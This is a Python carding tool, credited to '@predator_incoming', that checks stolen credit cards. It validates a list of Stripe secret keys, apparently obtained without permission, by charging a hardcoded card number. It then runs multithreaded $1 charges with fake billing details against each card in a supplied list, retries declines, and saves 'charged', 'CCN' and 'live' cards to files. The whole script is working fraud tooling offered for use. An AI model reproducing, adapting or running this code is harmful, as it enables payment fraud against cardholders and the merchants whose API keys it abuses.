from stripe import error
import random
import stripe
import sys
import colorama
import requests
from threading import *
import threading
from queuelib import queue
requests.packages.urllib3.disable_warnings()
colorama.init()


CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'
RESET = '\033[0m'
BLUE = "\033[34m"
CYAN = "\033[36m"
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = "\033[m"
REVERSE = "\033[m"

banner = """
\033[1;35;40m


         ▄▄▄·▄▄▄  ▄▄▄ .·▄▄▄▄   ▄▄▄·▄▄▄▄▄      ▄▄▄  
        ▐█ ▄█▀▄ █·▀▄.▀·██▪ ██ ▐█ ▀█•██  ▪     ▀▄ █·
         ██▀·▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌▄█▀▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ 
        ▐█▪·•▐█•█▌▐█▄▄▌██. ██ ▐█ ▪▐▌▐█▌·▐█▌.▐▌▐█•█▌
        .▀   .▀  ▀ ▀▀▀ ▀▀▀▀▀•  ▀  ▀ ▀▀▀  ▀█▄▀▪.▀  ▀


\n\t           CODED BY - @predator_incoming
\n\t       SHARE AND SUPPORT BY - @predatorfamily
\n\t [Python based cc checker (capable of using multiple public sk )]
\033[0;37;40m
"""
print(CLEAR_SCREEN)
print(banner)
#################################################################################################################


def skcheck(msk):
    stripe.api_key = msk
    try:
        token = stripe.Token.create(
            card={
                "number": "5115889281408200",
                "exp_month": 5,
                "exp_year": 2026,
                "cvc": "332",
            })
        charge = stripe.Charge.create(
            amount=100,
            currency="usd",
            source=token,
            description="PredatorDonation",
        )
    except error.RateLimitError as e:
        return True
    except error.InvalidRequestError as e:
        return False
    except error.APIError as e:
        return False
    except error.CardError:
        return True
    except error.AuthenticationError as e:
        return False

########################################################################################################


def paymentintent(amnt, cur, cc, month, year, cvv):
    pm = stripe.PaymentMethod.create(
        type='card',
        card={
            "number": f"{cc}",
            "exp_month": month,
            "exp_year": year,
            "cvc": f"{cvv}",
        },
        billing_details={
            "address": {
                "line1": "newyork st",
                "city": "newyork",
                "state": "newyork",
                "postal_code": "10080",
                "country": "US"
            },
            "name": "john smith",
            "phone": "9098184872",
            "email": "johnyliveer123@gmail.com"
        },
    ).id
    pi = stripe.PaymentIntent.create(amount=amnt,
                                     currency=f"{cur}",
                                     payment_method_types=["card"],
                                     off_session=True,
                                     description='PredatorDonation',
                                     payment_method=pm,
                                     confirm=True)
    return pi

#################################################################################################################


def chk(pips, sks, byp):
    random_index = random.randrange(len(sks))
    random_value = sks[random_index]
    curr = 'usd'
    amounts = 100
    cc = str(pips).split("|")[0]
    month = str(pips).split("|")[1]
    year = str(pips).split("|")[2]
    cvv = str(pips).split("|")[3]
    stripe.api_key = random_value
    try:
        pi = paymentintent(amounts, curr, cc, month, year, cvv)
        chargeresp = pi.charges.data[0]
        msg = chargeresp.outcome.seller_message
        cvvchk = chargeresp.payment_method_details.card.checks
        cvccheck = cvvchk.cvc_check
        if cvccheck != 'pass':
            response = 'Charged Card [CCN]'
        else:
            response = "Charged card [CVV]"
        print(
            GREEN+f''' [CHARGED]  =>   {pips}   MESSAGE =>  1$  {response}  [{msg}]  BYPASSING => '''+BLUE+f'''[{byp}]'''+GREEN+'   BY - @predator_incoming')
        with open("charged.txt", 'a') as sav:
            sav.write(
                f''' [CHARGED]  =>   {pips}   MESSAGE =>  1$  {response}  [{msg}]  BYPASSING => [{byp}]   BY - @predator_incoming''')
            sav.write('\n')
        return True
    except error.CardError as e:
        try:
            carderr = e.error
            try:
                chargeresp = carderr.payment_intent.charges.data[0]
            except:
                pass
            msg = carderr.message
            respp = carderr.decline_code
            if respp is None:
                respp = carderr.code
            try:
                cvccheck = cvvchk.cvc_check
            except:
                cvccheck = 'fail'
            if respp == 'incorrect_cvc':
                print(
                    GREEN+f''' [CCN] =>   {pips}   MESSAGE =>   {msg}  [{respp}]  BYPASSINGING => '''+BLUE+f'''[{byp}]'''+GREEN+'   BY - @predator_incoming')
                with open("CCN.txt", 'a') as sav:
                    sav.write(
                        f''' [CCN]  =>   {pips}   MESSAGE =>   {msg}  [{respp}]  BYPASSING => [{byp}]   BY - @predator_incoming''')
                    sav.write('\n')

            elif cvccheck == 'pass' or respp == 'insufficient_funds':
                print(
                    GREEN+f''' [LIVE] =>   {pips}   MESSAGE =>   {msg}  [{respp}]  BYPASSING => '''+BLUE+f'''[{byp}]'''+GREEN+'   BY - @predator_incoming')
                with open("Approvedinsuff.txt", 'a') as sav:
                    sav.write(
                        f''' [LIVE]  =>   {pips}   MESSAGE =>   {msg}  [{respp}]  BYPASSING => [{byp}]   BY - @predator_incoming''')
                    sav.write('\n')
            else:
                print(
                    RED + f''' [DEAD] =>   {pips}   MESSAGE =>  {msg}  [{respp}]  BYPASSING => '''+BLUE+f'''[{byp}]'''+RED+'   BY - @predator_incoming')
            return True
        except error.CardError as e:
            return False
    except error.AuthenticationError as e:
        print(RED + f" authentications error occured {e}")
        return True
    except error.RateLimitError:
        return False
    except error.StripeError as e:
        return False


#######################################################################################################

if __name__ == "__main__":
    try:
        list = input(BLUE+" Enter the file name of ccs : ")
        bot1 = input(BLUE+" Enter the Amount of Thread : ")
    except:
        print(RED+" An Error occured while taking input - please check the details and enter carefully")
        sys.exit()
    try:
        sks = []
        lol = 0
        msk = input(BLUE+" Enter the name of file which contains sk : ")
        print(GREEN+"\n Checking Your sks ... \n ")
        with open(msk) as w:
            for i in w:
                sk = i.split('\n')[0]
                if skcheck(sk):
                    lol = lol + 1
                    print(GREEN+f"Live sks Found - [ {lol} ]  ")
                    if sk not in sks:
                        sks.append(sk)
        print('\n')
    except:
        print(RED+" An Error occured while taking input - please check the details and enter carefully")
        sys.exit()
    asu = open(list).read().splitlines()
    jobs = queue.Queue()

    def do_stuff(q):
        while not q.empty():
            i = q.get()
            result = False
            byp = 0
            while not result:
                result = chk(i, sks, byp)
                byp = byp + 1
            q.task_done()

    for trgt in asu:
        jobs.put(trgt)

    for i in range(int(bot1)):
        worker = threading.Thread(target=do_stuff, args=(jobs,))
        worker.start()
    jobs.join()
